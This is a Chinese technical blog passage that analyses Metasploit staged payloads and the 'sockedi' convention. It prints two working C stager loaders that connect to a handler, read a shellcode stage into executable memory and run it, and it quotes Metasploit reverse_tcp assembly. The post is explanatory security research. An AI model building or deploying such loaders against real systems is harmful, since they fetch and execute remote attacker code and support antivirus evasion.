<a href=#%e5%8a%a0%e8%bd%bd%e5%99%a8stagers%e5%9b%9e%e8%bf%9e%e7%9a%84%e5%85%b7%e4%bd%93%e6%b5%81%e7%a8%8b aria-label=加载器(Stagers)回连的具体流程>加载器(Stagers)回连的具体流程</a></li></ul>
</li>
<li>
<a href=#%e8%bf%99%e4%b8%aa%e8%bd%bd%e8%8d%b7stages%e5%85%b7%e4%bd%93%e6%98%af%e6%80%8e%e4%b9%88%e7%94%9f%e6%88%90%e7%9a%84 aria-label=这个载荷Stages具体是怎么生成的？>这个载荷Stages具体是怎么生成的？</a></li>
<li>
<a href=#%e6%89%80%e8%b0%93%e7%9a%84sockedi%e5%88%b0%e5%ba%95%e6%98%af%e5%95%a5 aria-label=所谓的sockedi到底是啥？>所谓的sockedi到底是啥？</a><ul>
<li>
<a href=#%e8%b7%9f%e8%b8%aaedi aria-label=跟踪edi>跟踪edi</a></li>
<li>
<a href=#%e5%88%86%e6%9e%90%e7%94%a8%e4%bd%9c%e8%bd%bd%e8%8d%b7%e7%9a%84%e5%8f%8d%e5%b0%84dll aria-label=分析用作载荷的反射dll>分析用作载荷的反射dll</a></li></ul>
</li>
<li>
<a href=#%e6%80%bb%e7%bb%93 aria-label=总结>总结</a><ul>
<li>
<a href=#%e4%b8%8b%e4%b8%80%e6%ad%a5%e5%8f%af%e4%bb%a5%e5%81%9a%e7%9a%84 aria-label=下一步可以做的>下一步可以做的</a></li>
<li>
<a href=#%e7%8e%b0%e5%9c%a8%e5%b0%b1%e5%8f%af%e4%bb%a5%e5%be%97%e5%88%b0%e7%9a%84 aria-label=现在就可以得到的>现在就可以得到的</a>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?</p>
<h2 id=背景>背景<a hidden class=anchor aria-hidden=true href=#背景>#</a></h2>
<p>最近在做一些msf相关的事情，今天听到免杀相关的，去查询了下相关资料。</p>
<p>第一个不能错过的就是cobalt strike作者早年写的metasploit-loader项目了，我看了项目源码，找了一些相关资料</p>
<p>在 <a href=https://xz.aliyun.com/t/1709>Meterpreter载荷执行原理分析</a> 文章发现了一些细节性的东西，也感谢该文作者的抛砖引玉，不过文中有一些错误以及未说明白的地方，我会一一道来。</p>
<p>注意：本文只是对我自己的分析结果进行一次复盘，如果有什么错误之处欢迎大家斧正</p>
<h2 id=metasploit-loader>metasploit loader<a hidden class=anchor aria-hidden=true href=#metasploit-loader>#</a></h2>
<h3 id=metasploit的shellcode到底做了什么>metasploit的shellcode到底做了什么<a hidden class=anchor aria-hidden=true href=#metasploit的shellcode到底做了什么>#</a></h3>
<p>首先我们需要探讨的第一个问题是metasploit的shellcode到底做了什么？</p>
<p>在msf的官方wiki中，官方有对这个问题做一些简单的解释</p>
<ul>
<li><a href=https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work>How payloads work</a></li>
<li><a href=https://zhuanlan.zhihu.com/p/61412226>中文翻译版在这</a></li>
</ul>
<p>从上面的文章我们大致能知道其实我们使用msf生成的shellcode只是一个加载器(Stagers)，然后加载器通过我们生成shellcode时指定的ip和端口回连过来取到真正执行的恶意载荷(Stages)</p>
<h3 id=加载器stagers回连的具体流程>加载器(Stagers)回连的具体流程<a hidden class=anchor aria-hidden=true href=#加载器stagers回连的具体流程>#</a></h3>
<p>那么提出第二个问题，这个加载器(Stagers)回连的具体代码流程是怎样的？</p>
<p>我们通过文档只能知道Stagers通过网络加载Stages，那么Stages是什么？shellcode？可执行文件？反射dll？这些我们还都不清楚。</p>
<p>然后通过网上一些零星的资料，找到了msf邮件组曾经的两封邮件（源地址已无法访问，所幸WebArchive有留存）</p>
<ul>
<li><a href=https://web.archive.org/web/20160729173425/https://dev.metasploit.com/pipermail/framework/2012-September/008660.html>[framework] inline meterpreter payload</a></li>
<li><a href=https://web.archive.org/web/20160729173608/https://dev.metasploit.com/pipermail/framework/2012-September/008664.html>[framework] inline meterpreter payload</a></li>
</ul>
<p>里面提到流程以及关键点</p>
<p><strong>流程</strong></p>
<blockquote>
<p>No tutorials that I know of, but here are the basic steps:</p>
<ul>
<li>connect to the handler</li>
<li>read a 4-byte length</li>
<li>allocate a length-byte buffer</li>
<li>mark it as writable and executable (on Windows you&rsquo;ll need
VirtualProtect for this)</li>
<li>read length bytes into that buffer</li>
<li>jump to the buffer. easiest way to do this in C is cast it to a
function pointer and call it.</li>
</ul>
</blockquote>
<p><strong>关键点</strong></p>
<blockquote>
<p>Assuming this is for X86 arch, you have to make sure that the EDI
register contains your socket descriptor (the value of the ConnectSocket
variable). You can do this via inline asm, but it might be easier to
just prepend the 5 bytes for setting it to your shellcode:</p>
<p>BF 78 56 34 12 mov edi, 0x12345678</p>
<p>For 64 bit, you have to use the RDI register (and need 10 bytes):</p>
<p>48 BF 78 56 34 12 00 00 00 00 mov rdi, 0x12345678</p>
<p>Hope this helps,</p>
<p>Michael</p>
<p>PS: This is the reason why the calling convention within Metasploit is
called &ldquo;sockedi&rdquo; :-)</p>
</blockquote>
<p>也就是说主要的流程大致上就是</p>
<ol>
<li>tcp连接</li>
<li>读取socket前四个byte，这个为后面的载荷的长度</li>
<li>分配可读可写可执行的内存，把载荷塞进去</li>
<li>注意这段载荷的前面需要手动加 <code>mov edi, &socket</code></li>
<li>然后跳转到这块内存进行执行</li>
</ol>
<p>实现起来并不困难，但是有些奇怪的点，比如为什么需要手动把edi的值设置为socket的地址？这个我们先放一放，看看一些loader的源码</p>
<p><strong>首先是<a href=https://github.com/rsmudge/metasploit-loader>cobalt strike作者的</a></strong></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> argv[]) {
	ULONG32 size;
	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> buffer;
	<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>function)();

	winsock_init();

	<span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
		printf(<span style=color:#e6db74>&#34;%s [host] [port]</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
		exit(<span style=color:#ae81ff>1</span>);
	}

	<span style=color:#75715e>/* connect to the handler */</span>
	SOCKET my_socket <span style=color:#f92672>=</span> wsconnect(argv[<span style=color:#ae81ff>1</span>], atoi(argv[<span style=color:#ae81ff>2</span>]));

	<span style=color:#75715e>/* read the 4-byte length */</span>
	<span style=color:#66d9ef>int</span> count <span style=color:#f92672>=</span> recv(my_socket, (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>size, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>);
	<span style=color:#66d9ef>if</span> (count <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>||</span> size <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>)
		punt(my_socket, <span style=color:#e6db74>&#34;read a strange or incomplete length value</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

	<span style=color:#75715e>/* allocate a RWX buffer */</span>
	buffer <span style=color:#f92672>=</span> VirtualAlloc(<span style=color:#ae81ff>0</span>, size <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	<span style=color:#66d9ef>if</span> (buffer <span style=color:#f92672>==</span> NULL)
		punt(my_socket, <span style=color:#e6db74>&#34;could not allocate buffer</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

	<span style=color:#75715e>/* prepend a little assembly to move our SOCKET value to the EDI register
</span><span style=color:#75715e>	   thanks mihi for pointing this out
</span><span style=color:#75715e>	   BF 78 56 34 12     =&gt;      mov edi, 0x12345678 */</span>
	buffer[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xBF</span>;

	<span style=color:#75715e>/* copy the value of our socket to the buffer */</span>
	memcpy(buffer <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#f92672>&amp;</span>my_socket, <span style=color:#ae81ff>4</span>);

	<span style=color:#75715e>/* read bytes into the buffer */</span>
	count <span style=color:#f92672>=</span> recv_all(my_socket, buffer <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>, size);

	<span style=color:#75715e>/* cast our buffer as a function and call it */</span>
	function <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>)())buffer;
	function();

	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>其他的函数我并没有列出来，里面的实现应该也很明白，就是我之前说的流程</p>
<p><strong>然后是先知社区的，其实也就是把上一份代码注释翻译了一下</strong></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>//主函数
</span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> argv[]) {
    ULONG32 size;
    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span> buffer;
    <span style=color:#75715e>//创建函数指针，方便XXOO
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>function)();
    winsock_init(); <span style=color:#75715e>//套接字初始化
</span><span style=color:#75715e></span>    <span style=color:#75715e>//获取参数，这里随便写，接不接收无所谓，主要是传递远程主机IP和端口
</span><span style=color:#75715e></span>    <span style=color:#75715e>//这个可以事先定义好
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
        printf(<span style=color:#e6db74>&#34;%s [host] [port] ^__^ </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
        exit(<span style=color:#ae81ff>1</span>);
    }

    <span style=color:#75715e>/*连接到处理程序，也就是远程主机 */</span>
    SOCKET my_socket <span style=color:#f92672>=</span> my_connect(argv[<span style=color:#ae81ff>1</span>], atoi(argv[<span style=color:#ae81ff>2</span>]));

    <span style=color:#75715e>/* 读取4字节长度
</span><span style=color:#75715e>    *这里是meterpreter第一次发送过来的
</span><span style=color:#75715e>    *4字节缓冲区大小2E840D00，大小可能会有所不同,当然也可以自己丢弃，自己定义一个大小
</span><span style=color:#75715e>    */</span>
    <span style=color:#75715e>//是否报错
</span><span style=color:#75715e></span>    <span style=color:#75715e>//如果第一次不是接收的4字节那么就退出程序
</span><span style=color:#75715e></span>    <span style=color:#66d9ef>int</span> count <span style=color:#f92672>=</span> recv(my_socket, (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>size, <span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>0</span>);
    <span style=color:#66d9ef>if</span> (count <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>||</span> size <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>)
        punt(my_socket, <span style=color:#e6db74>&#34;read length value Error</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

    <span style=color:#75715e>/* 分配一个缓冲区 RWX buffer */</span>
    buffer <span style=color:#f92672>=</span> VirtualAlloc(<span style=color:#ae81ff>0</span>, size <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    <span style=color:#66d9ef>if</span> (buffer <span style=color:#f92672>==</span> NULL)
        punt(my_socket, <span style=color:#e6db74>&#34;could not alloc buffer</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

    <span style=color:#75715e>/* 
</span><span style=color:#75715e>    *SOCKET赋值到EDI寄存器，装载到buffer[]中
</span><span style=color:#75715e>    */</span>
    <span style=color:#75715e>//mov edi
</span><span style=color:#75715e></span>    buffer[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xBF</span>;

    <span style=color:#75715e>/* 把我们的socket里的值复制到缓冲区中去*/</span>
    memcpy(buffer <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>, <span style=color:#f92672>&amp;</span>my_socket, <span style=color:#ae81ff>4</span>);

    <span style=color:#75715e>/* 读取字节到缓冲区
</span><span style=color:#75715e>    *这里就循环接收DLL数据，直到接收完毕
</span><span style=color:#75715e>    */</span>
    count <span style=color:#f92672>=</span> recv_all(my_socket, buffer <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>, size);

    <span style=color:#75715e>/* 将缓冲区作为函数并调用它。
</span><span style=color:#75715e>    * 这里可以看作是shellcode的装载，
</span><span style=color:#75715e>    * 因为这本身是一个DLL装载器，完成使命，控制权交给DLL，
</span><span style=color:#75715e>    * 但本身不退出，除非迁移进程，靠DLL里函数，DLL在DLLMain里是循环接收指令的，直到遇到退出指令，
</span><span style=color:#75715e>    * (void (*)())buffer的这种用法经常出现在shellcode中
</span><span style=color:#75715e>    */</span>
    function <span style=color:#f92672>=</span> (<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>)())buffer;
    function();
    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>两份代码都没解决我们的疑问</p>
<p>我们直接翻翻msf源码</p>
<p><a href=https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/reverse_tcp.rb>lib/msf/core/payload/windows/reverse_tcp.rb</a></p>
<p>代码比较长我就不贴了，简要说一下， <code>asm_block_recv</code> 函数是接收载荷的函数，然后我们看看 <code>asm_reverse_tcp</code></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm>      create_socket:
        <span style=color:#a6e22e>push</span> <span style=color:#75715e>#{encoded_host}    ; host in little-endian format
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#75715e>#{encoded_port}    ; family AF_INET and port number
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>mov</span> <span style=color:#66d9ef>esi</span>, <span style=color:#66d9ef>esp</span>            <span style=color:#75715e>; save pointer to sockaddr struct
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; if we succeed, eax will be zero, push zero for the flags param.
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; push null for reserved parameter
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; we do not specify a WSAPROTOCOL_INFO structure
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; we do not specify a protocol
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>inc</span> <span style=color:#66d9ef>eax</span>                 <span style=color:#75715e>;
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; push SOCK_STREAM
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>inc</span> <span style=color:#66d9ef>eax</span>                 <span style=color:#75715e>;
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#66d9ef>eax</span>                <span style=color:#75715e>; push AF_INET
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>push</span> <span style=color:#75715e>#{Rex::Text.block_api_hash(&#39;ws2_32.dll&#39;, &#39;WSASocketA&#39;)}
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>call</span> <span style=color:#66d9ef>ebp</span>                <span style=color:#75715e>; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>xchg</span> <span style=color:#66d9ef>edi</span>, <span style=color:#66d9ef>eax</span>           <span style=color:#75715e>; save the socket for later, don&#39;t care about the value of eax after this
</span></code></pre></td></tr></table>
</div>
</div><p>call WSASocketA 之后返回的是socket句柄，返回值一般是在eax里面，然后把eax赋值到了edi</p>
<p>继续找找edi，但是发现剩下的edi都是用作调用，好像没有什么明显的作用，那为什么有这个？</p>
<h2 id=这个载荷stages具体是怎么生成的>这个载荷Stages具体是怎么生成的？<a hidden class=anchor aria-hidden=true href=#这个载荷stages具体是怎么生成的>#</a></h2>
<p>这里就要引入我刚才说的先知上的那篇文章的问题了，在 <a href=https://xz.aliyun.com/t/1709>Meterpreter载荷执行原理分析</a> 文章中，作者提到</p>
<blockquote>
<p>metasploit的meterpreter的payload调用了meterpreter_loader.rb文件，在meterpreter_loader.rb文件中又引入了reflective_dll_loader.rb文件，reflective_dll_loader.rb主要是获取ReflectiveLoader()的偏移地址，用于重定位使用，没有什么可分析的。我们来到这个文件里reflectivedllinject.rb，这个文件主要是修复反射dll的，meterpreter_loader.rb文件主要是用于自身模块使用，修复dll和读取payload的长度的。</p>
</blockquote>
<p>其实 <code>windows/meterpreter/reverse_tcp</code> 是走的 <code>meterpreter_loader</code>，而不是文中的 <code>reflectivedllinject</code>，我通过调试发现这个请求载荷的过程是流经 <code>meterpreter_loader</code> 文件的</p>
<p>不过这两个文件的功效都是差不多的，我们打开分析一下</p>
<p>映入眼帘的应该是这段</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
